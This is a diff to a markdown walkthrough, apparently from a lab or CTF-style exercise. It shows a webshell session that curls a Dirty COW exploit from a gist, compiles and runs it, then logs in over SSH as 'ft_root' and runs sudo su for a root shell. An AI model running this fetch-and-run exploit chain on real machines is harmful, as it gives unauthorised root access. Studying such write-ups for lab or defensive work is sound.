@@ -15,9 +15,13 @@ The upgraded script modifying not only `root`, but also `ft_root` (see [here](ht
 This works perfectly from anywhere, but I prefer to run it using webshell `wsh.sh` that is running under www-data user.
 
 ```bash
-wsh > curl -ks "https://gist.githubusercontent.com/mhufflep/92a45e88f18e04a1e1de5c9657337dc0/raw/7fce15bc59f96144b463b642c7705339ef4f25b8/cow.c" > cow.c
+wsh > curl -ks "https://gist.githubusercontent.com/mhufflep/92a45e88f18e04a1e1de5c9657337dc0/raw/f560ab89d1592603053df93df598a66e4083c41c/cow.c" > cow.c
 
 wsh > gcc cow.c -o dirty -lpthread -lcrypt
 
 wsh > ./dirty 4242
 ```
+
+Wait 1-2 minutes and just `ssh ft_root@192.168.64.6` with password `4242`. <br>
+
+`ft_root` is in sudo group, so we can simply `sudo su` with `4242` to get root shell.
